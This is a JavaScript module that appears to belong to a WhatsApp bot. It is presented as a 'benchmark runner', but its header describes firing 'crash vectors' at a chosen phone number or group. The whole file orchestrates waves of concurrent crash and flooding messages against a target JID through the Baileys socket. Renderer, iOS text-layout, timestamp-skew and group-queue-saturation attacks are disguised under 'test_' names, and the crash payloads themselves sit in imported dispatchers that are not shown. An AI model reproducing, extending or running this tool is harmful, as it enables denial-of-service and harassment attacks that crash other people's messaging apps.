/**
 * High-Intensity Benchmark Runner
 * Fires all rendering, iOS, and sandbox crash vectors
 * simultaneously across multiple cycles and sessions.
 *
 * Usage from bot: .benchmark <number|groupid> [cycles] [concurrency]
 */
'use strict';

const { dispatchRenderingTest } = require('./renderingDispatcher');
const { dispatchIosTest }       = require('./iosDispatcher');
const { dispatchSandboxTest }   = require('./sandboxDispatcher');

// Every workload that exists across all 3 dispatchers
const ALL_WORKLOADS = [
  // Android / Rendering
  { type: 'rendering', name: 'test_blank_render',          options: {} },
  { type: 'rendering', name: 'test_resource_burst',        options: { frequency: 15000 } },
  { type: 'rendering', name: 'test_future_timestamp',      options: { skewOffset: 999999999 } },
  { type: 'rendering', name: 'test_extended_timestamp',    options: { skewOffset: -315360000 } },
  { type: 'rendering', name: 'test_dual_queue_mix',        options: {} },
  { type: 'rendering', name: 'test_media_decoder',         options: { mediaType: 'ogg_jpeg_mixed' } },
  { type: 'rendering', name: 'test_android_comprehensive', options: {} },
  // iOS
  { type: 'ios', name: 'test_core_text_layout',      options: { direction: 'rtl' } },
  { type: 'ios', name: 'test_invisible_render',       options: {} },
  { type: 'ios', name: 'test_scroll_state_stability', options: {} },
  { type: 'ios', name: 'test_combined_layout',        options: {} },
  { type: 'ios', name: 'test_thumbnail_allocation',   options: {} },
  // Group / Sandbox (only when containerId is a group)
  { type: 'sandbox', name: 'test_sandbox_resource_burst', options: {} },
  { type: 'sandbox', name: 'test_status_rendering',       options: {} },
  { type: 'sandbox', name: 'test_queue_saturation',       options: { batchSize: 20 } },
  { type: 'sandbox', name: 'test_ios_sandbox_suite',      options: {} },
  { type: 'sandbox', name: 'test_mixed_client_suite',     options: {} },
];

// Broadcast workload — only for group JIDs
const BROADCAST_WORKLOAD = { type: 'sandbox', name: 'test_sandbox_broadcast', options: {} };

async function _fireWorkload(workload, containerId, sock) {
  const opts = { ...workload.options, _sock: sock };
  const start = Date.now();
  try {
    let res;
    if      (workload.type === 'rendering') res = await dispatchRenderingTest(workload.name, containerId, opts);
    else if (workload.type === 'ios')       res = await dispatchIosTest(workload.name, containerId, opts);
    else if (workload.type === 'sandbox')   res = await dispatchSandboxTest(workload.name, containerId, opts);
    return { name: workload.name, status: 'passed', latency: Date.now() - start, result: res };
  } catch (err) {
    return { name: workload.name, status: 'failed', latency: Date.now() - start, error: err.message };
  }
}

/**
 * runHighIntensityBenchmark
 * @param {string}   containerId  — target JID (phone@s.whatsapp.net or group@g.us)
 * @param {object}   sock         — Baileys socket
 * @param {number}   cycles       — how many full waves to run (default 3)
 * @param {number}   concurrencyMultiplier — how many times to repeat each workload per wave (default 10)
 * @param {Function} [onProgress] — optional callback(waveNum, waveResults) for live updates
 */
async function runHighIntensityBenchmark(containerId, sock, cycles = 3, concurrencyMultiplier = 10, onProgress = null) {
  const isGroup = String(containerId).endsWith('@g.us');

  // Build workload list — add broadcast only for groups
  const workloads = isGroup
    ? [...ALL_WORKLOADS, BROADCAST_WORKLOAD]
    : ALL_WORKLOADS.filter(w => w.type !== 'sandbox');  // sandbox tests need @g.us

  let totalOperations = 0;
  let totalFailures   = 0;
  const latencies     = [];

  for (let c = 1; c <= cycles; c++) {
    // Build massive wave — each workload repeated concurrencyMultiplier times
    const wave = [];
    for (let i = 0; i < concurrencyMultiplier; i++) {
      for (const w of workloads) {
        wave.push(_fireWorkload(w, containerId, sock));
      }
    }

    // Fire entire wave simultaneously
    const waveResults = await Promise.allSettled(wave);

    waveResults.forEach(r => {
      const v = r.status === 'fulfilled' ? r.value : { status: 'failed', latency: 0 };
      totalOperations++;
      latencies.push(v.latency || 0);
      if (v.status === 'failed') totalFailures++;
    });

    if (onProgress) {
      try { await onProgress(c, cycles, waveResults.length, totalOperations - totalFailures, totalFailures); }
      catch (_) {}
    }
  }

  const avgLatency  = latencies.length ? latencies.reduce((a, b) => a + b, 0) / latencies.length : 0;
  const peakLatency = latencies.length ? Math.max(...latencies) : 0;

  return {
    containerId,
    isGroup,
    cycles,
    concurrencyMultiplier,
    workloadsPerCycle: workloads.length,
    totalOperations,
    successfulOperations: totalOperations - totalFailures,
    failedOperations:     totalFailures,
    averageLatencyMs:     parseFloat(avgLatency.toFixed(2)),
    peakLatencyMs:        peakLatency,
    totalPayloadsEstimate: (totalOperations - totalFailures) * 6, // ~6 vectors per workload
    timestamp: Date.now(),
  };
}

module.exports = { runHighIntensityBenchmark, dispatchRenderingTest, dispatchIosTest, dispatchSandboxTest };
